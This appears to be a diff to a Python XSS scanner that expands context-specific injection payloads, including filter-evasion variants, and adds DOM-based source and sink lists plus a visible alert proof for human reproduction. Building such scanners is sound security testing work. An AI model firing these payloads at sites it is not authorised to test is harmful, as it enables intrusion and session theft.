@@ -41,27 +41,116 @@ DANGEROUS = ("<", ">", "\"", "'", "(", ")", "/", "=", "`")
 
 MARKER = "__cb_xss_fired"
 
-#: One payload per context. ``MARK`` is replaced with the call that proves
-#: execution, so the same payloads work with and without a browser.
+#: Payloads by the context the reflection landed in.
+#:
+#: ``MARK`` is replaced with whatever proves execution — a silent marker for
+#: the headless browser, since an alert() would block it. The *visible*
+#: equivalent handed to a human is built by :func:`visible`, because a
+#: reproduction URL containing ``window.__cb_xss_fired=1`` fires perfectly
+#: and shows nothing, which reads as a false positive to the person checking
+#: it.
+#:
+#: Ordered cheapest and most likely first: there is no point sending twenty
+#: vectors at a parameter that is properly encoded, and the first one that
+#: survives is the one that gets reported. Sources are PortSwigger's XSS
+#: cheat sheet (the no-interaction tags and the animation/SVG handlers come
+#: straight from it) plus the usual breakout set for each context.
 BY_CONTEXT = {
-    "html": ['<img src=x onerror="MARK">',
-             '<svg onload="MARK">',
-             '<script>MARK</script>'],
-    "attribute-double": ['" onmouseover="MARK" x="',
-                         '"><img src=x onerror="MARK">',
-                         '" autofocus onfocus="MARK" x="'],
-    "attribute-single": ["' onmouseover='MARK' x='",
-                         "'><img src=x onerror='MARK'>",
-                         "' autofocus onfocus='MARK' x='"],
-    "attribute-bare": [' onmouseover=MARK ',
-                       '><img src=x onerror=MARK>'],
-    "script": ["';MARK;//", '";MARK;//', "-MARK-", "</script><img src=x "
-                                                   "onerror=MARK>"],
-    "raw-text": ['</textarea><img src=x onerror="MARK">',
-                 '</title><img src=x onerror="MARK">',
-                 '</style><img src=x onerror="MARK">'],
-    "comment": ['--><img src=x onerror="MARK">'],
+    # Reflected directly into the document body.
+    "html": [
+        '<img src=x onerror="MARK">',
+        '<svg onload="MARK">',
+        '<script>MARK</script>',
+        '<body onload="MARK">',
+        '<audio src/onerror="MARK">',
+        '<video><source onerror="MARK">',
+        '<details open ontoggle="MARK">',
+        '<svg><animate onbegin="MARK" attributeName=x dur=1s>',
+        '<iframe srcdoc="&lt;script&gt;parent.MARK&lt;/script&gt;">',
+        '<object data="javascript:MARK">',
+        '<input autofocus onfocus="MARK">',
+        '<marquee onstart="MARK">',
+        '<xss onfocus="MARK" autofocus tabindex=1>',
+        # Case and spacing variants, for the naive blocklist that greps
+        # for "<script" or "onerror=".
+        '<ImG sRc=x OnErRoR="MARK">',
+        '<img\tsrc=x\tonerror="MARK">',
+        '<svg/onload="MARK">',
+    ],
+    # Inside a double-quoted attribute value.
+    "attribute-double": [
+        '" onmouseover="MARK" x="',
+        '"><img src=x onerror="MARK">',
+        '" autofocus onfocus="MARK" x="',
+        '"><svg onload="MARK">',
+        '" onfocusin="MARK" autofocus tabindex=1 x="',
+        '"><details open ontoggle="MARK">',
+    ],
+    "attribute-single": [
+        "' onmouseover='MARK' x='",
+        "'><img src=x onerror='MARK'>",
+        "' autofocus onfocus='MARK' x='",
+        "'><svg onload='MARK'>",
+        "' onfocusin='MARK' autofocus tabindex=1 x='",
+    ],
+    "attribute-bare": [
+        ' onmouseover=MARK ',
+        '><img src=x onerror=MARK>',
+        ' autofocus onfocus=MARK ',
+        '><svg onload=MARK>',
+    ],
+    # Inside an existing <script> block.
+    "script": [
+        "';MARK;//",
+        '";MARK;//',
+        "-MARK-",
+        "</script><img src=x onerror=MARK>",
+        "\\';MARK;//",
+        "*/MARK;/*",
+        "${MARK}",
+        "`;MARK;//",
+    ],
+    # Inside a raw-text element, where the tag has to be closed first.
+    "raw-text": [
+        '</textarea><img src=x onerror="MARK">',
+        '</title><img src=x onerror="MARK">',
+        '</style><img src=x onerror="MARK">',
+        '</noscript><img src=x onerror="MARK">',
+        '</template><img src=x onerror="MARK">',
+        '</iframe><img src=x onerror="MARK">',
+    ],
+    "comment": [
+        '--><img src=x onerror="MARK">',
+        '--><svg onload="MARK">',
+    ],
+    # Reflected into an href/src/action, where a tag is not needed at all.
+    "url": [
+        'javascript:MARK',
+        'javascript:MARK//',
+        'jaVaScRipt:MARK',
+        'java\tscript:MARK',
+        'data:text/html,<script>MARK</script>',
+    ],
+    # Reflected into a style context.
+    "style": [
+        '</style><img src=x onerror="MARK">',
+        'x:expression(MARK)',
+    ],
 }
+
+#: Sinks worth looking for in page script when the reflection is not in the
+#: served HTML at all. A value that reaches one of these from location.*
+#: is DOM-based XSS, which never appears in the response body and so is
+#: invisible to everything above.
+DOM_SOURCES = ("location.hash", "location.search", "location.href",
+               "document.URL", "document.documentURI",
+               "document.baseURI", "window.name", "document.referrer",
+               "location.pathname")
+DOM_SINKS = ("innerHTML", "outerHTML", "insertAdjacentHTML", "document.write",
+             "document.writeln", "eval(", "setTimeout(", "setInterval(",
+             "Function(", "execScript(", "location.replace",
+             "location.assign", "$(", ".html(", ".append(", ".after(",
+             ".before(", ".replaceWith(", "srcdoc", "jQuery.globalEval")
 
 #: What the browser is asked to call. Kept trivial so a CSP that allows
 #: inline handlers at all will allow it.
@@ -69,6 +158,22 @@ BROWSER_MARK = f"window.{MARKER}=1"
 #: What is looked for when there is no browser: an alert is only used as a
 #: textual marker in that case, never executed by the scanner.
 TEXT_MARK = f"window.{MARKER}=1"
+
+#: What a person is given. alert() is deliberate: it is the one thing that
+#: is unmistakable in a browser, and nothing automated ever loads this.
+HUMAN_MARK = "alert(document.domain)"
+
+
+def visible(payload):
+    """The same payload with a proof a human can actually see.
+
+    The scanner sends ``window.__cb_xss_fired=1`` because it can read that
+    back and because an alert() blocks a headless browser. Handing the same
+    string to somebody as "paste this into a browser" produced a URL that
+    executed correctly and displayed nothing — indistinguishable, from the
+    outside, from the finding being wrong.
+    """
+    return (payload or "").replace("MARK", HUMAN_MARK)
 
 
 _BROWSER_STATE = {}
@@ -229,7 +334,10 @@ class XssCheck:
                          point.build(canary, "replace"), auth=ctx.auth,
                          note=context["excerpt"]),
                     step("Payload for that context", request, response,
-                         auth=ctx.auth, payload=payload, decisive=True,
+                         auth=ctx.auth, payload=payload,
+                         # The URL the report hands a human carries the
+                         # visible form, not the silent marker.
+                         proof_payload=visible(template), decisive=True,
                          body_limit=400)])
             # Reflection, executable context and execution are three
             # different things and the report has to say which one it has.
